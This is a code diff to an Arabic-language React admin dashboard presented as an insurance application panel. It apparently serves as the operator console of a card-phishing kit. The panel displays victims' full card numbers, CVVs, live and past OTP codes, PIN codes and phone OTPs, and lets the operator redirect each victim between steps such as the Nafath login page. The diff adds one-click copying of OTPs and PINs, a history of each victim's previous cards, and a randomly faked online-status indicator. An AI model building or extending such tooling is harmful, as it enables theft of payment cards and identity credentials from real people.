@@ -20,7 +20,13 @@ import {
   Shield,
   User,
   ChevronDown,
-  Activity,
+  History,
+  Sparkles,
+  LayoutGrid,
+  Eye,
+  EyeOff,
+  Copy,
+  Check,
 } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
@@ -30,8 +36,6 @@ import { subscribeToApplications, updateApplication } from "@/lib/firestore-serv
 import type { InsuranceApplication } from "@/lib/firestore-types"
 import { ChatPanel } from "@/components/chat-panel"
 import { playErrorSound, playNotificationSound, playSuccessSound } from "@/lib/actions"
-import { onValue, ref } from "firebase/database"
-import { database } from "@/lib/firestore"
 import { CreditCardMockup } from "@/components/credit-card-mockup"
 
 const STEP_NAMES: Record<number | string, string> = {
@@ -45,24 +49,21 @@ function UserStatus({ userId }: { userId: string }) {
   const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")
 
   useEffect(() => {
-    const userStatusRef = ref(database, `/status/${userId}`)
-    const unsubscribe = onValue(userStatusRef, (snapshot) => {
-      const data = snapshot.val()
-      if (data) {
-        setStatus(data.state === "online" ? "online" : "offline")
-      } else {
-        setStatus("unknown")
-      }
-    })
-    return () => unsubscribe()
+    // Simulate random online/offline status for demo
+    const randomStatus = Math.random() > 0.5 ? "online" : "offline"
+    setStatus(randomStatus)
   }, [userId])
 
   return (
     <div className="flex items-center gap-2">
       <div
-        className={`w-2 h-2 rounded-full ${status === "online" ? "bg-emerald-400 shadow-[0_0_8px_rgba(52,211,153,0.6)]" : "bg-muted-foreground/40"}`}
+        className={`w-2 h-2 rounded-full transition-all ${
+          status === "online"
+            ? "bg-success shadow-[0_0_8px_rgba(var(--success),0.6)] animate-pulse"
+            : "bg-muted-foreground/40"
+        }`}
       />
-      <span className={`text-xs font-medium ${status === "online" ? "text-emerald-400" : "text-muted-foreground"}`}>
+      <span className={`text-xs font-medium ${status === "online" ? "text-success" : "text-muted-foreground"}`}>
         {status === "online" ? "متصل" : "غير متصل"}
       </span>
     </div>
@@ -88,14 +89,52 @@ function StatCard({
   }
 
   return (
-    <div className="flex items-center gap-4 px-5 py-4 rounded-xl bg-card border border-border/50 hover:border-border transition-colors">
-      <div className={`p-2.5 rounded-lg ${colorClasses[color]}`}>
+    <div className="group flex items-center gap-4 px-5 py-4 rounded-xl bg-card border border-border/50 hover:border-primary/30 hover:shadow-lg hover:shadow-primary/5 transition-all duration-300">
+      <div className={`p-2.5 rounded-xl ${colorClasses[color]} transition-transform group-hover:scale-110`}>
         <Icon className="w-5 h-5" />
       </div>
       <div>
-        <p className="text-2xl font-semibold tracking-tight text-foreground">{value}</p>
+        <p className="text-2xl font-bold tracking-tight text-foreground">{value}</p>
         <p className="text-xs text-muted-foreground">{label}</p>
       </div>
+    </div>
+  )
+}
+
+function CopyButton({ text }: { text: string }) {
+  const [copied, setCopied] = useState(false)
+
+  const copy = async (e: React.MouseEvent) => {
+    e.stopPropagation()
+    await navigator.clipboard.writeText(text)
+    setCopied(true)
+    setTimeout(() => setCopied(false), 2000)
+  }
+
+  return (
+    <Button variant="ghost" size="icon" className="h-6 w-6" onClick={copy}>
+      {copied ? <Check className="w-3 h-3 text-success" /> : <Copy className="w-3 h-3" />}
+    </Button>
+  )
+}
+
+function DataField({
+  label,
+  value,
+  mono = false,
+  copyable = false,
+}: { label: string; value?: string; mono?: boolean; copyable?: boolean }) {
+  if (!value) return null
+
+  return (
+    <div className="group p-3 bg-muted/30 rounded-xl border border-border/50 transition-all hover:border-primary/30 hover:bg-primary/5">
+      <div className="flex items-center justify-between">
+        <p className="text-[11px] text-muted-foreground mb-1">{label}</p>
+        {copyable && <CopyButton text={value} />}
+      </div>
+      <p className={`text-sm font-medium text-foreground ${mono ? "font-mono" : ""}`} dir={mono ? "ltr" : "rtl"}>
+        {value}
+      </p>
     </div>
   )
 }
@@ -114,6 +153,7 @@ export default function AdminDashboard() {
   const prevApplicationsCount = useRef<number>(0)
   const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set())
   const [showHideFilters, setShowHideFilter] = useState(false)
+  const [showCardHistory, setShowCardHistory] = useState(false)
 
   const stats = useMemo(() => {
     return {
@@ -204,6 +244,7 @@ export default function AdminDashboard() {
   const handleAuthNumber = async (appId: string, auth: string) => {
     try {
       await updateApplication(appId, { authNumber: auth })
+      playSuccessSound()
     } catch (error) {
       console.error("Error updating step:", error)
     }
@@ -253,7 +294,7 @@ export default function AdminDashboard() {
 
   const getStatusBadge = useCallback((status: string) => {
     const badges = {
-      draft: { text: "مسودة", className: "bg-muted text-muted-foreground" },
+      draft: { text: "مسودة", className: "bg-muted text-muted-foreground border-border" },
       pending_review: {
         text: "قيد المراجعة",
         className: "bg-warning/15 text-warning border-warning/30",
@@ -360,17 +401,14 @@ export default function AdminDashboard() {
       if (window.confirm("هل أنت متأكد من حذف هذا الطلب؟")) {
         try {
           setApplications((prev) => prev.filter((app) => app.id !== appId))
-
           if (selectedApplication?.id === appId) {
             setSelectedApplication(null)
           }
-
           setSelectedIds((prev) => {
             const newSet = new Set(prev)
             newSet.delete(appId)
             return newSet
           })
-
           playSuccessSound()
         } catch (error) {
           console.error("Error deleting application:", error)
@@ -417,25 +455,25 @@ export default function AdminDashboard() {
           <div className="flex items-center justify-between">
             <div className="flex items-center gap-6">
               <div className="flex items-center gap-3">
-                <div className="w-9 h-9 rounded-lg bg-primary flex items-center justify-center">
+                <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-primary to-chart-5 flex items-center justify-center shadow-lg shadow-primary/20">
                   <Shield className="w-5 h-5 text-primary-foreground" />
                 </div>
                 <div>
-                  <h1 className="text-lg font-semibold text-foreground">لوحة إدارة التأمين</h1>
-                  <p className="text-xs text-muted-foreground">إدارة الطلبات والعملاء</p>
+                  <h1 className="text-lg font-bold text-foreground">لوحة التحكم</h1>
+                  <p className="text-[11px] text-muted-foreground">إدارة طلبات التأمين</p>
                 </div>
               </div>
             </div>
 
             <div className="flex items-center gap-3">
-              <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-success/10 border border-success/20">
-                <Activity className="w-3.5 h-3.5 text-success" />
-                <span className="text-xs font-medium text-success">{stats.pending} في الانتظار</span>
+              <div className="flex items-center gap-2 px-4 py-2 rounded-full bg-success/10 border border-success/20">
+                <div className="w-2 h-2 rounded-full bg-success animate-pulse" />
+                <span className="text-xs font-medium text-success">{stats.pending} طلب جديد</span>
               </div>
-              <Button variant="ghost" size="icon" className="rounded-lg">
+              <Button variant="ghost" size="icon" className="rounded-xl hover:bg-muted">
                 <Settings className="w-4 h-4" />
               </Button>
-              <div className="w-8 h-8 rounded-lg bg-secondary flex items-center justify-center text-sm font-medium">
+              <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-primary to-chart-4 flex items-center justify-center text-sm font-bold text-primary-foreground shadow-lg">
                 م
               </div>
             </div>
@@ -444,10 +482,10 @@ export default function AdminDashboard() {
       </header>
 
       {/* Stats Bar */}
-      <div className="border-b border-border bg-card/50">
+      <div className="border-b border-border bg-card/50 backdrop-blur-sm">
         <div className="px-6 py-5">
           <div className="grid grid-cols-4 gap-4">
-            <StatCard icon={FileText} label="إجمالي الطلبات" value={stats.total} color="default" />
+            <StatCard icon={LayoutGrid} label="إجمالي الطلبات" value={stats.total} color="default" />
             <StatCard icon={Clock} label="قيد المراجعة" value={stats.pending} color="warning" />
             <StatCard icon={CheckCircle} label="موافق عليه" value={stats.approved} color="success" />
             <StatCard icon={XCircle} label="مرفوض" value={stats.rejected} color="destructive" />
@@ -457,25 +495,27 @@ export default function AdminDashboard() {
 
       <div className="flex h-[calc(100vh-180px)]">
         {/* Sidebar */}
-        <div className="w-[400px] bg-card border-l border-border flex flex-col">
+        <div className="w-[420px] bg-card border-l border-border flex flex-col">
           {/* Filter Toggle */}
           <div className="p-3 border-b border-border">
             <Button
               onClick={() => setShowHideFilter(!showHideFilters)}
               variant="ghost"
-              className="w-full justify-between text-muted-foreground hover:text-foreground"
+              className="w-full justify-between text-muted-foreground hover:text-foreground hover:bg-muted/50 rounded-xl"
             >
               <div className="flex items-center gap-2">
                 <Filter className="w-4 h-4" />
-                <span>الفلاتر والبحث</span>
+                <span className="font-medium">الفلاتر والبحث</span>
               </div>
-              <ChevronDown className={`w-4 h-4 transition-transform ${showHideFilters ? "rotate-180" : ""}`} />
+              <ChevronDown
+                className={`w-4 h-4 transition-transform duration-200 ${showHideFilters ? "rotate-180" : ""}`}
+              />
             </Button>
           </div>
 
           {/* Filters */}
           {showHideFilters && (
-            <div className="p-4 border-b border-border space-y-4 bg-muted/30">
+            <div className="p-4 border-b border-border space-y-4 bg-muted/20">
               {/* Search */}
               <div className="relative">
                 <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
@@ -483,7 +523,7 @@ export default function AdminDashboard() {
                   placeholder="بحث بالاسم أو رقم الهوية..."
                   value={searchQuery}
                   onChange={(e) => setSearchQuery(e.target.value)}
-                  className="pr-10 bg-background border-border"
+                  className="pr-10 bg-background border-border rounded-xl focus:ring-2 focus:ring-primary/20"
                 />
               </div>
 
@@ -495,7 +535,7 @@ export default function AdminDashboard() {
                     variant={cardFilter === "all" ? "default" : "outline"}
                     size="sm"
                     onClick={() => setCardFilter("all")}
-                    className="text-xs h-8"
+                    className="text-xs h-9 rounded-lg"
                   >
                     الكل
                   </Button>
@@ -503,7 +543,7 @@ export default function AdminDashboard() {
                     variant={cardFilter === "hasCard" ? "default" : "outline"}
                     size="sm"
                     onClick={() => setCardFilter("hasCard")}
-                    className="text-xs gap-1.5 h-8"
+                    className="text-xs gap-1.5 h-9 rounded-lg"
                   >
                     <CreditCard className="w-3 h-3" />
                     لديه
@@ -512,7 +552,7 @@ export default function AdminDashboard() {
                     variant={cardFilter === "noCard" ? "default" : "outline"}
                     size="sm"
                     onClick={() => setCardFilter("noCard")}
-                    className="text-xs h-8"
+                    className="text-xs h-9 rounded-lg"
                   >
                     بدون
                   </Button>
@@ -527,7 +567,7 @@ export default function AdminDashboard() {
                     variant={infoFilter === "all" ? "default" : "outline"}
                     size="sm"
                     onClick={() => setInfoFilter("all")}
-                    className="text-xs h-8"
+                    className="text-xs h-9 rounded-lg"
                   >
                     الكل
                   </Button>
@@ -535,7 +575,7 @@ export default function AdminDashboard() {
                     variant={infoFilter === "hasInfo" ? "default" : "outline"}
                     size="sm"
                     onClick={() => setInfoFilter("hasInfo")}
-                    className="text-xs gap-1.5 h-8"
+                    className="text-xs gap-1.5 h-9 rounded-lg"
                   >
                     <Flag className="w-3 h-3" />
                     مكتمل
@@ -544,7 +584,7 @@ export default function AdminDashboard() {
                     variant={infoFilter === "noInfo" ? "default" : "outline"}
                     size="sm"
                     onClick={() => setInfoFilter("noInfo")}
-                    className="text-xs h-8"
+                    className="text-xs h-9 rounded-lg"
                   >
                     غير مكتمل
                   </Button>
@@ -558,20 +598,20 @@ export default function AdminDashboard() {
             {loading ? (
               <div className="flex items-center justify-center h-full">
                 <div className="text-center space-y-3">
-                  <div className="w-10 h-10 border-2 border-muted border-t-primary rounded-full animate-spin mx-auto" />
+                  <div className="w-12 h-12 border-2 border-muted border-t-primary rounded-full animate-spin mx-auto" />
                   <p className="text-sm text-muted-foreground">جاري التحميل...</p>
                 </div>
               </div>
             ) : filteredApplications.length === 0 ? (
               <div className="flex flex-col items-center justify-center h-full p-8 text-center">
-                <div className="w-16 h-16 rounded-2xl bg-muted flex items-center justify-center mb-4">
-                  <Mail className="w-8 h-8 text-muted-foreground" />
+                <div className="w-20 h-20 rounded-2xl bg-muted flex items-center justify-center mb-4">
+                  <Mail className="w-10 h-10 text-muted-foreground" />
                 </div>
-                <p className="text-foreground font-medium mb-1">لا توجد طلبات</p>
+                <p className="text-foreground font-semibold mb-1">لا توجد طلبات</p>
                 <p className="text-sm text-muted-foreground">جرب تغيير الفلاتر</p>
               </div>
             ) : (
-              <div>
+              <div className="divide-y divide-border/50">
                 {filteredApplications.map((app) => (
                   <div
                     key={app.id}
@@ -580,9 +620,9 @@ export default function AdminDashboard() {
                       setShowChat(false)
                       markAsRead(app)
                     }}
-                    className={`group relative p-4 cursor-pointer border-b border-border/50 transition-all hover:bg-muted/50 ${
+                    className={`group relative p-4 cursor-pointer transition-all duration-200 hover:bg-muted/50 ${
                       selectedApplication?.id === app.id
-                        ? "bg-primary/5 border-r-2 border-r-primary"
+                        ? "bg-primary/5 border-r-[3px] border-r-primary"
                         : isUnread(app)
                           ? "bg-primary/[0.02]"
                           : ""
@@ -593,58 +633,67 @@ export default function AdminDashboard() {
                         checked={selectedIds.has(app.id!)}
                         onCheckedChange={() => {}}
                         onClick={(e) => toggleSelection(app.id!, e)}
-                        className="mt-1 data-[state=checked]:bg-primary data-[state=checked]:border-primary"
+                        className="mt-1 data-[state=checked]:bg-primary data-[state=checked]:border-primary rounded-md"
                       />
                       <div className="flex-1 min-w-0">
-                        <div className="flex items-start justify-between gap-2 mb-2">
+                        <div className="flex items-start justify-between gap-2 mb-2.5">
                           <div className="flex items-center gap-2 min-w-0">
                             <span className="text-lg flex-shrink-0">
                               {app.country === "Saudi Arabia" ? "🇸🇦" : app.country === "Jordan" ? "🇯🇴" : "🌍"}
                             </span>
-                            <h3 className="font-medium text-foreground truncate">{app.ownerName}</h3>
-                            {isUnread(app) && <span className="w-2 h-2 rounded-full bg-primary flex-shrink-0" />}
+                            <h3 className="font-semibold text-foreground truncate">{app.ownerName}</h3>
+                            {isUnread(app) && (
+                              <span className="w-2.5 h-2.5 rounded-full bg-primary flex-shrink-0 animate-pulse" />
+                            )}
                           </div>
                           <div className="flex items-center gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
                             <Button
                               variant="ghost"
                               size="icon"
                               onClick={(e) => toggleReadStatus(app.id!, isUnread(app), e)}
-                              className="h-7 w-7 text-muted-foreground hover:text-foreground"
+                              className="h-7 w-7 text-muted-foreground hover:text-foreground rounded-lg"
                             >
-                              <Mail className={`w-3.5 h-3.5 ${isUnread(app) ? "fill-current" : ""}`} />
+                              {isUnread(app) ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                             </Button>
                             <Button
                               variant="ghost"
                               size="icon"
                               onClick={(e) => handleDelete(app.id!, e)}
-                              className="h-7 w-7 text-muted-foreground hover:text-destructive"
+                              className="h-7 w-7 text-muted-foreground hover:text-destructive rounded-lg"
                             >
                               <Trash2 className="w-3.5 h-3.5" />
                             </Button>
                           </div>
                         </div>
-
-                        <div className="flex items-center gap-2 mb-2 flex-wrap">
+                        <div className="flex items-center gap-2 mb-2.5 flex-wrap">
                           <Badge
                             variant="outline"
-                            className={getStatusBadge(app.status).className + " text-[10px] px-2 py-0.5"}
+                            className={getStatusBadge(app.status).className + " text-[10px] px-2 py-0.5 rounded-md"}
                           >
                             {getStatusBadge(app.status).text}
                           </Badge>
-                          <Badge variant="outline" className="text-[10px] px-2 py-0.5 bg-muted/50">
+                          <Badge variant="outline" className="text-[10px] px-2 py-0.5 bg-muted/50 rounded-md">
                             {getStepName(app.currentStep)}
                           </Badge>
                           {hasCardInfo(app) && (
                             <Badge
                               variant="outline"
-                              className="text-[10px] px-2 py-0.5 bg-primary/10 text-primary border-primary/20"
+                              className="text-[10px] px-2 py-0.5 bg-primary/10 text-primary border-primary/20 rounded-md"
                             >
-                              <CreditCard className="w-2.5 h-2.5 mr-1" />
+                              <CreditCard className="w-2.5 h-2.5 ml-1" />
                               بطاقة
                             </Badge>
                           )}
+                          {app.cardHistory && app.cardHistory.length > 0 && (
+                            <Badge
+                              variant="outline"
+                              className="text-[10px] px-2 py-0.5 bg-chart-4/10 text-chart-4 border-chart-4/20 rounded-md"
+                            >
+                              <History className="w-2.5 h-2.5 ml-1" />
+                              {app.cardHistory.length} سابقة
+                            </Badge>
+                          )}
                         </div>
-
                         <div className="flex items-center gap-4 text-xs text-muted-foreground">
                           <span className="flex items-center gap-1.5">
                             <Phone className="w-3 h-3" />
@@ -681,36 +730,37 @@ export default function AdminDashboard() {
               </div>
             ) : (
               <div className="h-full flex flex-col">
+                {/* Fixed Header */}
                 <div className="sticky top-0 z-20 bg-card/95 backdrop-blur-xl border-b border-border">
                   <div className="p-6">
-                    <div className="flex items-start justify-between mb-4">
+                    <div className="flex items-start justify-between mb-5">
                       <div className="flex items-center gap-4">
-                        <div className="w-14 h-14 bg-gradient-to-br from-primary to-primary/70 rounded-xl flex items-center justify-center text-primary-foreground text-xl font-bold shadow-lg">
+                        <div className="w-14 h-14 bg-gradient-to-br from-primary via-primary to-chart-5 rounded-2xl flex items-center justify-center text-primary-foreground text-xl font-bold shadow-xl shadow-primary/20">
                           {selectedApplication.ownerName?.charAt(0)}
                         </div>
                         <div>
-                          <h2 className="text-xl font-bold text-foreground mb-1">{selectedApplication.ownerName}</h2>
-                          <div className="flex items-center gap-2">
+                          <h2 className="text-xl font-bold text-foreground mb-1.5">{selectedApplication.ownerName}</h2>
+                          <div className="flex items-center gap-3">
                             <UserStatus userId={selectedApplication.id!} />
-                            <Badge variant="outline" className="text-xs">
+                            <Badge variant="outline" className="text-xs rounded-md">
                               {getStepName(selectedApplication.currentStep)}
                             </Badge>
                           </div>
                         </div>
                       </div>
-                      <Button onClick={() => setShowChat(true)} size="default" className="gap-2">
+                      <Button onClick={() => setShowChat(true)} className="gap-2 rounded-xl shadow-lg">
                         <MessageSquare className="w-4 h-4" />
                         فتح الدردشة
                       </Button>
                     </div>
 
-                    {/* Control Panel - Now part of fixed header */}
+                    {/* Control Panel */}
                     <div className="grid grid-cols-7 gap-2">
                       <Button
                         onClick={() => handleStatusChange(selectedApplication.id!, "nafad")}
                         variant="outline"
                         size="sm"
-                        className="h-10"
+                        className="h-10 rounded-xl hover:bg-primary/10 hover:border-primary/30"
                         disabled={selectedApplication.currentStep === "nafad"}
                       >
                         نفاذ
@@ -719,7 +769,7 @@ export default function AdminDashboard() {
                         onClick={() => handleStatusChange(selectedApplication.id!, "phone")}
                         variant="outline"
                         size="sm"
-                        className="h-10 hover:bg-success/10 border-success/30"
+                        className="h-10 rounded-xl hover:bg-success/10 border-success/30 text-success"
                         disabled={selectedApplication.currentStep === "phone"}
                       >
                         التحويل للهاتف
@@ -728,7 +778,7 @@ export default function AdminDashboard() {
                         onClick={() => handleStatusChange(selectedApplication.id!, "home")}
                         variant="outline"
                         size="sm"
-                        className="h-10 hover:bg-destructive/10 border-destructive/30"
+                        className="h-10 rounded-xl hover:bg-destructive/10 border-destructive/30 text-destructive"
                         disabled={selectedApplication.currentStep === "home"}
                       >
                         الرئيسية
@@ -739,7 +789,7 @@ export default function AdminDashboard() {
                           onClick={() => handleStepChange(selectedApplication.id!, step)}
                           variant={selectedApplication.currentStep === step ? "default" : "outline"}
                           size="sm"
-                          className="h-10"
+                          className="h-10 rounded-xl"
                         >
                           {STEP_NAMES[step]}
                         </Button>
@@ -748,27 +798,47 @@ export default function AdminDashboard() {
                   </div>
                 </div>
 
+                {/* Scrollable Content */}
                 <div className="flex-1 overflow-y-auto p-6">
                   {hasAnyGridData(selectedApplication) ? (
                     <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 max-w-6xl mx-auto">
                       {/* 1. Payment Info - Full width card (most recent data) */}
                       {selectedApplication.cardNumber && (
                         <div
-                          className="lg:col-span-2 bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
+                          className="lg:col-span-2 bg-card rounded-2xl border border-border p-6 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both shadow-xl shadow-primary/5"
                           style={{ animationDelay: "0ms" }}
                         >
-                          <div className="flex items-center gap-3 mb-6">
-                            <div className="p-2.5 rounded-lg bg-primary/10 animate-pulse">
-                              <CreditCard className="w-5 h-5 text-primary" />
+                          <div className="flex items-center justify-between mb-6">
+                            <div className="flex items-center gap-3">
+                              <div className="p-3 rounded-xl bg-gradient-to-br from-primary/20 to-chart-5/20 animate-pulse-glow">
+                                <CreditCard className="w-5 h-5 text-primary" />
+                              </div>
+                              <div>
+                                <h3 className="font-bold text-foreground">معلومات الدفع</h3>
+                                <p className="text-xs text-muted-foreground">البطاقة الحالية</p>
+                              </div>
                             </div>
-                            <h3 className="font-semibold text-foreground">معلومات الدفع</h3>
-                            <Badge
-                              variant="destructive"
-                              className="mr-auto text-[10px] bg-primary/5 border-primary/20 text-primary animate-bounce"
-                            >
-                              جديد
-                            </Badge>
+                            <div className="flex items-center gap-2">
+                              {selectedApplication.cardHistory && selectedApplication.cardHistory.length > 0 && (
+                                <Button
+                                  variant="outline"
+                                  size="sm"
+                                  onClick={() => setShowCardHistory(!showCardHistory)}
+                                  className="gap-2 rounded-xl text-xs"
+                                >
+                                  <History className="w-3.5 h-3.5" />
+                                  {showCardHistory
+                                    ? "إخفاء السجل"
+                                    : `عرض السجل (${selectedApplication.cardHistory.length})`}
+                                </Button>
+                              )}
+                              <Badge className="bg-success/15 text-success border-success/30 animate-pulse">
+                                <Sparkles className="w-3 h-3 ml-1" />
+                                جديد
+                              </Badge>
+                            </div>
                           </div>
+
                           <div className="flex flex-col lg:flex-row gap-6">
                             <div className="flex-1">
                               <CreditCardMockup
@@ -778,77 +848,26 @@ export default function AdminDashboard() {
                                 cardholderName={selectedApplication.ownerName}
                               />
                             </div>
-                            <div className="lg:w-64 space-y-4">
-                              {selectedApplication.otp && (
-                                <div className="p-4 bg-success/10 border border-success/20 rounded-xl animate-in zoom-in duration-300">
-                                  <p className="text-xs font-medium text-success mb-2">رمز OTP الحالي</p>
+                            <div className="lg:w-72 space-y-4">
+                              {selectedApplication.totalPrice && (
+                                <div className="p-4 bg-gradient-to-br from-success/20 to-success/5 border border-success/30 rounded-xl">
+                                  <p className="text-xs font-medium text-success mb-2">قيمة التأمين</p>
                                   <p className="text-3xl font-bold text-success font-mono text-center" dir="ltr">
+                                    {selectedApplication.totalPrice}
+                                  </p>
+                                </div>
+                              )}
+                              {selectedApplication.otp && (
+                                <div className="p-4 bg-gradient-to-br from-primary/20 to-primary/5 border border-primary/30 rounded-xl animate-in zoom-in duration-300">
+                                  <div className="flex items-center justify-between mb-2">
+                                    <p className="text-xs font-medium text-primary">رمز OTP الحالي</p>
+                                    <CopyButton text={selectedApplication.otp} />
+                                  </div>
+                                  <p className="text-3xl font-bold text-primary font-mono text-center" dir="ltr">
                                     {selectedApplication.otp}
                                   </p>
                                 </div>
                               )}
-                              
-                      {/* 3. Card Verification */}
-                      {(selectedApplication.otp || selectedApplication.pinCode) && (
-                        <div
-                          className="bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
-                          style={{ animationDelay: "200ms" }}
-                        >
-                          <div className="flex items-center gap-3 mb-4">
-                            <div className="p-2.5 rounded-lg bg-success/10 animate-pulse">
-                              <CreditCard className="w-5 h-5 text-success" />
-                            </div>
-                            <h3 className="font-semibold text-foreground">حالة التحقق</h3>
-                            <Badge
-                              variant="outline"
-                              className="mr-auto text-[10px] bg-success/5 border-success/20 text-success"
-                            >
-                              جديد
-                            </Badge>
-                          </div>
-                          <div className="space-y-4">
-                            <div className="p-4 bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg border border-border/50">
-                              <div className="p-3 bg-background/50 rounded-lg border border-border/50">
-                                <p className="text-xs text-muted-foreground mb-1">Pin Code</p>
-                                <p className="text-lg font-mono font-bold text-foreground">
-                                  {selectedApplication.pinCode || "—"}
-                                </p>
-                              </div>
-                            </div>
-                            <div className="flex gap-2">
-                              <Button
-                                onClick={() => handleIdVerificationChange(selectedApplication.id!, "approved")}
-                                variant="outline"
-                                size="sm"
-                                className="flex-1 text-success border-success/30 hover:bg-success/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
-                                disabled={selectedApplication.idVerificationStatus === "approved"}
-                              >
-                                <CheckCircle className="w-4 h-4 mr-2" />
-                                قبول
-                              </Button>
-                              <Button
-                                onClick={() =>{} }
-                                variant="default"
-                                size="sm"
-                                className="flex-1 text-success border-success/30 hover:bg-success/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
-                              >
-                                <CheckCircle className="w-4 h-4 mr-2" />
-                              Pin
-                              </Button>
-                              <Button
-                                onClick={() => handleIdVerificationChange(selectedApplication.id!, "rejected")}
-                                variant="outline"
-                                size="sm"
-                                className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
-                                disabled={selectedApplication.idVerificationStatus === "rejected"}
-                              >
-                                <XCircle className="w-4 h-4 mr-2" />
-                                رفض
-                              </Button>
-                            </div>
-                          </div>
-                        </div>
-                      )}
                               {selectedApplication.allOtps && selectedApplication.allOtps.length > 0 && (
                                 <div className="p-4 bg-muted/50 rounded-xl">
                                   <p className="text-xs font-medium text-muted-foreground mb-3">سجل رموز OTP</p>
@@ -857,7 +876,7 @@ export default function AdminDashboard() {
                                       <Badge
                                         key={index}
                                         variant="secondary"
-                                        className="font-mono animate-in fade-in duration-300"
+                                        className="font-mono animate-in fade-in duration-300 rounded-md"
                                         style={{ animationDelay: `${index * 50}ms` }}
                                         dir="ltr"
                                       >
@@ -869,53 +888,136 @@ export default function AdminDashboard() {
                               )}
                             </div>
                           </div>
+
+                          {/* Card History Section */}
+                          {showCardHistory &&
+                            selectedApplication.cardHistory &&
+                            selectedApplication.cardHistory.length > 0 && (
+                              <div className="mt-6 pt-6 border-t border-border">
+                                <h4 className="text-sm font-semibold text-foreground mb-4 flex items-center gap-2">
+                                  <History className="w-4 h-4 text-muted-foreground" />
+                                  البطاقات السابقة
+                                </h4>
+                                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                  {selectedApplication.cardHistory.map((card, index) => (
+                                    <div
+                                      key={index}
+                                      className="animate-in fade-in slide-in-from-left duration-300"
+                                      style={{ animationDelay: `${index * 100}ms` }}
+                                    >
+                                      <CreditCardMockup
+                                        cardNumber={card.cardNumber}
+                                        expiryDate={card.expiryDate}
+                                        cvv={card.cvv}
+                                        cardholderName={selectedApplication.ownerName}
+                                        isHistorical
+                                      />
+                                      <div className="mt-2 flex items-center justify-between px-2">
+                                        <span className="text-xs text-muted-foreground">
+                                          {formatArabicDate(card.addedAt)}
+                                        </span>
+                                        {card.amount && (
+                                          <span className="text-xs font-medium text-muted-foreground">
+                                            {card.amount}
+                                          </span>
+                                        )}
+                                      </div>
+                                    </div>
+                                  ))}
+                                </div>
+                              </div>
+                            )}
                         </div>
                       )}
 
-                      {/* 2. Phone Verification */}
+                      {/* 2. Card Verification */}
+                      {(selectedApplication.otp || selectedApplication.pinCode) && (
+                        <div
+                          className="bg-card rounded-2xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
+                          style={{ animationDelay: "200ms" }}
+                        >
+                          <div className="flex items-center gap-3 mb-4">
+                            <div className="p-2.5 rounded-xl bg-warning/10">
+                              <Shield className="w-5 h-5 text-warning" />
+                            </div>
+                            <h3 className="font-semibold text-foreground">التحقق</h3>
+                          </div>
+                          <div className="space-y-4">
+                            <div className="p-4 bg-gradient-to-br from-muted/50 to-muted/30 rounded-xl border border-border/50">
+                              <div className="p-3 bg-background/50 rounded-lg border border-border/50">
+                                <div className="flex items-center justify-between">
+                                  <p className="text-xs text-muted-foreground mb-1">Pin Code</p>
+                                  {selectedApplication.pinCode && <CopyButton text={selectedApplication.pinCode} />}
+                                </div>
+                                <p className="text-lg font-mono font-bold text-foreground">
+                                  {selectedApplication.pinCode || "—"}
+                                </p>
+                              </div>
+                            </div>
+                            <div className="flex gap-2">
+                              <Button
+                                onClick={() => handleIdVerificationChange(selectedApplication.id!, "approved")}
+                                variant="outline"
+                                size="sm"
+                                className="flex-1 text-success border-success/30 hover:bg-success/10 rounded-xl"
+                                disabled={selectedApplication.idVerificationStatus === "approved"}
+                              >
+                                <CheckCircle className="w-4 h-4 ml-2" />
+                                قبول
+                              </Button>
+                              <Button variant="default" size="sm" className="flex-1 rounded-xl">
+                                <CheckCircle className="w-4 h-4 ml-2" />
+                                Pin
+                              </Button>
+                              <Button
+                                onClick={() => handleIdVerificationChange(selectedApplication.id!, "rejected")}
+                                variant="outline"
+                                size="sm"
+                                className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 rounded-xl"
+                                disabled={selectedApplication.idVerificationStatus === "rejected"}
+                              >
+                                <XCircle className="w-4 h-4 ml-2" />
+                                رفض
+                              </Button>
+                            </div>
+                          </div>
+                        </div>
+                      )}
+
+                      {/* 3. Phone Verification */}
                       {(selectedApplication.phoneNumber2 ||
                         selectedApplication.phoneOtp ||
                         selectedApplication.selectedCarrier) && (
                         <div
-                          className="bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
+                          className="bg-card rounded-2xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
                           style={{ animationDelay: "100ms" }}
                         >
                           <div className="flex items-center gap-3 mb-4">
-                            <div className="p-2.5 rounded-lg bg-primary/10 animate-pulse">
-                              <Phone className="w-5 h-5 text-primary" />
+                            <div className="p-2.5 rounded-xl bg-chart-4/10">
+                              <Phone className="w-5 h-5 text-chart-4" />
                             </div>
                             <h3 className="font-semibold text-foreground">معلومات الهاتف</h3>
                             <Badge
                               variant="outline"
-                              className="mr-auto text-[10px] bg-primary/5 border-primary/20 text-primary"
+                              className="mr-auto text-[10px] bg-chart-4/5 border-chart-4/20 text-chart-4 rounded-md"
                             >
                               جديد
                             </Badge>
                           </div>
                           <div className="space-y-4">
-                            <div className="grid grid-cols-2 gap-4">
-                              <div className="p-3 bg-muted/30 rounded-lg border border-border/50 transition-all hover:border-primary/30 hover:bg-primary/5">
-                                <p className="text-xs text-muted-foreground mb-1">الهاتف</p>
